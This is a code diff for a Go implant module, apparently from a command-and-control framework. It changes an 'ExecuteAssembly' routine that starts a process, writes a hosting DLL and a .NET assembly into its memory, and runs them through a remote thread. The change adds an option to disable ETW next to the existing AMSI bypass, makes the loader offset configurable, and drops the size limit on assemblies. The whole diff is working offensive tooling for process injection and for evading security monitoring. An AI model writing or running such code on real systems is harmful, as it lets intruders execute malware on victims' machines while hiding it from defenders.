@@ -22,7 +22,7 @@ package taskrunner
 
 import (
 	"bytes"
-	"fmt"
+	"encoding/binary"
 
 	// {{if .Debug}}
 	"log"
@@ -42,10 +42,8 @@ import (
 )
 
 const (
-	BobLoaderOffset     = 0x00000d30 //0x00000af0
-	PROCESS_ALL_ACCESS  = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xfff
-	MAX_ASSEMBLY_LENGTH = 1025024
-	STILL_ACTIVE        = 259
+	PROCESS_ALL_ACCESS = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xfff
+	STILL_ACTIVE       = 259
 )
 
 var (
@@ -184,7 +182,7 @@ func LocalTask(data []byte, rwxPages bool) error {
 	return err
 }
 
-func ExecuteAssembly(hostingDll, assembly []byte, process, params string, amsi bool) (string, error) {
+func ExecuteAssembly(hostingDll, assembly []byte, process, params string, amsi bool, etw bool, offset uint32) (string, error) {
 	assemblySizeArr := convertIntToByteArr(len(assembly))
 	paramsSizeArr := convertIntToByteArr(len(params) + 1)
 	err := refresh()
@@ -195,9 +193,6 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, amsi b
 	log.Println("[*] Assembly size:", len(assembly))
 	log.Println("[*] Hosting dll size:", len(hostingDll))
 	// {{end}}
-	if len(assembly) > MAX_ASSEMBLY_LENGTH {
-		return "", fmt.Errorf("please use an assembly smaller than %d", MAX_ASSEMBLY_LENGTH)
-	}
 	var stdoutBuf, stderrBuf bytes.Buffer
 	cmd, err := startProcess(process, &stdoutBuf, &stderrBuf)
 	if err != nil {
@@ -226,10 +221,16 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, amsi b
 	// 4 bytes Assembly Size
 	// 4 bytes Params Size
 	// 1 byte AMSI bool  0x00 no  0x01 yes
+	// 1 byte ETW bool  0x00 no  0x01 yes
 	// parameter bytes
 	// assembly bytes
 	payload := append(assemblySizeArr, paramsSizeArr...)
 	if amsi {
+		payload = append(payload, byte(1))
+	} else {
+		payload = append(payload, byte(0))
+	}
+	if etw {
 		payload = append(payload, byte(1))
 	} else {
 		payload = append(payload, byte(0))
@@ -245,7 +246,7 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, amsi b
 	// {{if .Debug}}
 	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(payload), assemblyAddr)
 	// {{end}}
-	threadHandle, err := protectAndExec(handle, hostingDllAddr, uintptr(hostingDllAddr+BobLoaderOffset), assemblyAddr, uint32(len(hostingDll)))
+	threadHandle, err := protectAndExec(handle, hostingDllAddr, uintptr(hostingDllAddr)+uintptr(offset), assemblyAddr, uint32(len(hostingDll)))
 	if err != nil {
 		return "", err
 	}
@@ -419,15 +420,8 @@ func protectAndExec(handle windows.Handle, startAddr uintptr, threadStartAddr ui
 	return
 }
 
-func convertIntToByteArr(num int) (arr []byte) {
-	// This does the same thing as the union used in the DLL to convert intValue to byte array and back
-	arr = append(arr, byte(num%256))
-	v := num / 256
-	arr = append(arr, byte(v%256))
-	v = v / 256
-	arr = append(arr, byte(v%256))
-	v = v / 256
-	arr = append(arr, byte(v))
-
-	return
+func convertIntToByteArr(num int) []byte {
+	buff := make([]byte, 4)
+	binary.LittleEndian.PutUint32(buff, uint32(num))
+	return buff
 }
